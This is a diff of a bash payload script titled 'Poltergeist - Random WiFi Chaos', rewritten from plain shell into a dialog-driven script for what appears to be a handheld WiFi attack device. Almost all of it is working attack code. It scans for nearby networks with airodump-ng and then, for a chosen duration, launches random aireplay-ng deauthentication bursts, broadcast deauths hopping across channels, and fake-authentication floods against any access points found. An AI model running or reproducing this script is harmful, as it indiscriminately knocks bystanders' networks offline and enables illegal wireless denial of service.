@@ -1,115 +1,93 @@
-#!/bin/sh
+#!/bin/bash
 # Title: Poltergeist - Random WiFi Chaos
 # Author: NullSec
 # Description: Unpredictable WiFi disruption attacks
-# Category: WiFi Chaos
+# Category: nullsec/chaos
 
 LOOT_DIR="/mmc/nullsec/poltergeist"
 mkdir -p "$LOOT_DIR"
 
-echo "👻 POLTERGEIST - RANDOM CHAOS"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+PROMPT "POLTERGEIST - RANDOM CHAOS
 
-[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }
+Randomly disrupt WiFi with
+unpredictable attack patterns.
 
-echo -n "Chaos duration in seconds [180]: "
-read DURATION
-DURATION=${DURATION:-180}
+- Random deauth bursts
+- Random fake auth
+- Channel hopping attacks
+- Random timing
 
-echo ""
-echo "[*] Enabling monitor mode..."
-airmon-ng start wlan0 >/dev/null 2>&1
-MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
-[ -z "$MON_IF" ] && MON_IF="wlan0mon"
+Press OK to configure."
 
-LOG_FILE="$LOOT_DIR/chaos_$(date +%Y%m%d_%H%M).log"
-echo "Poltergeist Chaos Log - $(date)" > "$LOG_FILE"
+MON_IF=""
+for iface in wlan1mon wlan2mon wlan0mon; do
+    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
+done
+[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }
 
-# Scan for targets
-echo "[*] Scanning environment..."
+DURATION=$(NUMBER_PICKER "Chaos duration (sec):" 120)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=120 ;; esac
+
+resp=$(CONFIRMATION_DIALOG "UNLEASH POLTERGEIST?
+
+Duration: ${DURATION}s
+Interface: $MON_IF
+
+Random attacks will target
+nearby WiFi networks.
+
+Press OK to begin chaos.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
+
+LOG "Poltergeist unleashed..."
+
+# Quick scan
+SPINNER_START "Scanning targets..."
+rm -f /tmp/poltergeist*
 timeout 15 airodump-ng "$MON_IF" -w /tmp/poltergeist --output-format csv 2>/dev/null &
 sleep 15
+killall airodump-ng 2>/dev/null
+SPINNER_STOP
 
 # Build target list
-grep -E "^[0-9A-F]{2}:" /tmp/poltergeist-01.csv 2>/dev/null | \
-    awk -F',' '{print $1","$4","$14}' | head -20 > /tmp/targets.txt
+grep -E "^[0-9A-Fa-f]{2}:" /tmp/poltergeist-01.csv 2>/dev/null | \
+    awk -F',' '{print $1","$4","$14}' | head -20 > /tmp/polt_targets.txt
 
-TARGET_COUNT=$(wc -l < /tmp/targets.txt 2>/dev/null || echo 0)
-echo "[+] Found $TARGET_COUNT potential targets"
+TARGET_COUNT=$(wc -l < /tmp/polt_targets.txt 2>/dev/null || echo 0)
+LOG "Found $TARGET_COUNT targets"
 
-echo ""
-echo "[*] Unleashing Poltergeist..."
-echo "[*] Duration: ${DURATION}s"
-echo ""
-
+LOG_FILE="$LOOT_DIR/chaos_$(date +%Y%m%d_%H%M).log"
 END_TIME=$(($(date +%s) + DURATION))
 ATTACK_COUNT=0
 
 while [ $(date +%s) -lt $END_TIME ]; do
-    # Pick random attack type
-    ATTACK_TYPE=$((RANDOM % 4))
-    
-    # Pick random target
-    TARGET_LINE=$(shuf -n1 /tmp/targets.txt 2>/dev/null)
+    ATTACK_TYPE=$((RANDOM % 3))
+    TARGET_LINE=$(shuf -n1 /tmp/polt_targets.txt 2>/dev/null)
     BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
     CH=$(echo "$TARGET_LINE" | cut -d',' -f2 | tr -d ' ')
-    ESSID=$(echo "$TARGET_LINE" | cut -d',' -f3 | tr -d ' ')
-    
     [ -z "$BSSID" ] && continue
     [ -z "$CH" ] && CH=$((RANDOM % 11 + 1))
-    
+
     iwconfig "$MON_IF" channel $CH 2>/dev/null
-    
+
     case $ATTACK_TYPE in
-        0)
-            # Deauth burst
-            echo "[👻] Deauth burst -> $ESSID ($BSSID)"
-            echo "$(date +%H:%M:%S) DEAUTH $BSSID" >> "$LOG_FILE"
-            aireplay-ng -0 $((RANDOM % 20 + 5)) -a "$BSSID" "$MON_IF" 2>/dev/null &
-            sleep 3
-            ;;
-        1)
-            # Fake auth
-            echo "[👻] Fake auth -> $ESSID ($BSSID)"
-            echo "$(date +%H:%M:%S) FAKEAUTH $BSSID" >> "$LOG_FILE"
-            FAKE_MAC=$(printf '02:%02X:%02X:%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
-            timeout 5 aireplay-ng -1 0 -a "$BSSID" -h "$FAKE_MAC" "$MON_IF" 2>/dev/null &
-            sleep 3
-            ;;
-        2)
-            # Channel hop deauth
-            echo "[👻] Channel hop attack"
-            echo "$(date +%H:%M:%S) CHANNELHOP" >> "$LOG_FILE"
-            for i in 1 6 11; do
-                iwconfig "$MON_IF" channel $i 2>/dev/null
-                aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
-                sleep 1
-            done
-            ;;
-        3)
-            # Targeted client deauth (if clients visible)
-            echo "[👻] Random interference"
-            echo "$(date +%H:%M:%S) INTERFERENCE $BSSID" >> "$LOG_FILE"
-            aireplay-ng -0 10 -a "$BSSID" "$MON_IF" 2>/dev/null &
-            sleep 5
-            ;;
+        0) aireplay-ng -0 $((RANDOM % 15 + 3)) -a "$BSSID" "$MON_IF" 2>/dev/null & sleep 3 ;;
+        1) aireplay-ng -0 5 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 2 ;;
+        2) for c in 1 6 11; do iwconfig "$MON_IF" channel $c 2>/dev/null; aireplay-ng -0 3 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null & sleep 1; done ;;
     esac
-    
+
     ATTACK_COUNT=$((ATTACK_COUNT + 1))
     killall aireplay-ng 2>/dev/null
-    
-    # Random pause
     sleep $((RANDOM % 3 + 1))
 done
 
-# Cleanup
 killall aireplay-ng 2>/dev/null
-airmon-ng stop "$MON_IF" >/dev/null 2>&1
-rm -f /tmp/poltergeist* /tmp/targets.txt 2>/dev/null
+rm -f /tmp/poltergeist* /tmp/polt_targets.txt 2>/dev/null
 
-echo ""
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "👻 POLTERGEIST COMPLETE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "Attacks launched: $ATTACK_COUNT"
-echo "Log: $LOG_FILE"
+PROMPT "POLTERGEIST COMPLETE
+
+Attacks launched: $ATTACK_COUNT
+Duration: ${DURATION}s
+Log: $LOG_FILE
+
+Press OK to exit."
